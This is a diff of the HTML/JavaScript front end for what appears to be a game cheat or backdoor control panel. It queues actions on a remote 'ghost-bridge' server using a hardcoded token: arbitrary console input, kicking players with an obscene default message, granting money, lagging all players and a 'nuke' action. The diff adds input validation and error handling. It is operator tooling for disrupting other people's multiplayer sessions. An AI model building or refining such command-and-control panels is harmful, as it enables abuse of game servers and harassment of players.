@@ -6,9 +6,10 @@ body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; 
 h1 { color: #fff; }
 button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; cursor: pointer; }
 button:hover { background: #0f0; color: #000; }
-input { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
-#log { background: #000; border: 1px solid #333; height: 200px; overflow-y: scroll; padding: 10px; margin-top: 20px; }
+input { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; width: 150px; }
+#log { background: #000; border: 1px solid #333; height: 200px; overflow-y: scroll; padding: 10px; margin-top: 20px; white-space: pre-wrap; }
 .group { margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+.error { color: #ff0000; }
 </style>
 </head>
 <body>
@@ -25,17 +26,13 @@ input { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; mar
 <div class="group">
   <h3>Lag Switch</h3>
   <input id="lagDur" type="number" value="5">
-  <button onclick="execAction('lag')">LAG SINGLE (ID above?) NO - LAG SELF?</button>
-  <!-- Note: Current bridge logic for 'lag' targets the poller who sent it? 
-       Actually, in our architecture, 'lag' targets the specific client that polled.
-       So if you want to lag a specific player, you'd need to route it differently.
-       For now, 'lag' lags the first client that polls. -->
   <button onclick="execAction('lagAll')">LAG ALL PLAYERS</button>
+  <!-- Removed "Lag Single" because architecture routes global lag via client events -->
 </div>
 
 <div class="group">
   <h3>Kick Player</h3>
-  <input id="kickId" placeholder="Player ID (e.g., 5)" type="number">
+  <input id="kickId" placeholder="Player ID (e.g., 1)" type="number">
   <input id="kickMsg" placeholder="Reason" value="Suck my Nuts Bitch">
   <button onclick="execAction('kick')">EXECUTE KICK</button>
 </div>
@@ -53,26 +50,36 @@ input { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; mar
 const BRIDGE_URL = 'https://ghost-bridge-5626.onrender.com';
 const TOKEN = 'GHOST_2025';
 
-function log(msg) {
+function log(msg, isError = false) {
     const el = document.getElementById('log');
     const time = new Date().toLocaleTimeString();
-    el.innerHTML += `[${time}] ${msg}<br>`;
+    el.innerHTML += `<span class="${isError ? 'error' : ''}">[${time}] ${msg}</span><br>`;
     el.scrollTop = el.scrollHeight;
 }
 
 function execAction(action) {
     let body = { action: action };
 
+    // VALIDATION LOGIC
     if (action === 'console') {
-        body.input = document.getElementById('consoleInput').value;
+        body.input = document.getElementById('consoleInput').value.trim();
+        if (!body.input) return log("ERROR: Console input required", true);
     } else if (action === 'kick') {
-        body.targetId = parseInt(document.getElementById('kickId').value);
-        body.kickMsg = document.getElementById('kickMsg').value;
+        const rawId = document.getElementById('kickId').value;
+        body.targetId = parseInt(rawId, 10);
+        body.kickMsg = document.getElementById('kickMsg').value || "Suck my Nuts Bitch";
+        if (isNaN(body.targetId)) return log(`ERROR: Invalid Player ID "${rawId}". Must be a number.`, true);
     } else if (action === 'money') {
-        body.targetId = parseInt(document.getElementById('moneyId').value);
-        body.amount = parseInt(document.getElementById('moneyAmt').value);
-    } else if (action === 'lag') {
-        body.duration = parseInt(document.getElementById('lagDur').value);
+        const rawId = document.getElementById('moneyId').value;
+        const rawAmt = document.getElementById('moneyAmt').value;
+        body.targetId = parseInt(rawId, 10);
+        body.amount = parseInt(rawAmt, 10);
+        if (isNaN(body.targetId)) return log(`ERROR: Invalid Player ID "${rawId}".`, true);
+        if (isNaN(body.amount)) return log(`ERROR: Invalid Amount "${rawAmt}".`, true);
+    } else if (action === 'lagAll') {
+        // No specific inputs needed for global lag
+    } else if (action === 'nuke') {
+        // No specific inputs needed
     }
 
     fetch(`${BRIDGE_URL}/api/exec`, {
@@ -80,8 +87,12 @@ function execAction(action) {
         headers: { 'Content-Type': 'application/json', 'X-Ghost-Token': TOKEN },
         body: JSON.stringify(body)
     }).then(r => r.json()).then(d => {
-        log(`SUCCESS: ${JSON.stringify(d)}`);
-    }).catch(e => log(`ERROR: ${e.message}`));
+        if (d.status === 'queued') {
+            log(`SUCCESS: Queued [${action}]`);
+        } else {
+            log(`RESPONSE: ${JSON.stringify(d)}`, true);
+        }
+    }).catch(e => log(`NETWORK ERROR: ${e.message}`, true));
 }
 
 // Poll status
@@ -90,6 +101,8 @@ setInterval(() => {
         headers: { 'X-Ghost-Token': TOKEN }
     }).then(r => r.json()).then(d => {
         document.getElementById('status').innerText = `System Status: LINK ACTIVE | Players: ${d.players || 'Unknown'}`;
+    }).catch(() => {
+        document.getElementById('status').innerText = "System Status: CONNECTION LOST";
     });
 }, 3000);
 </script>
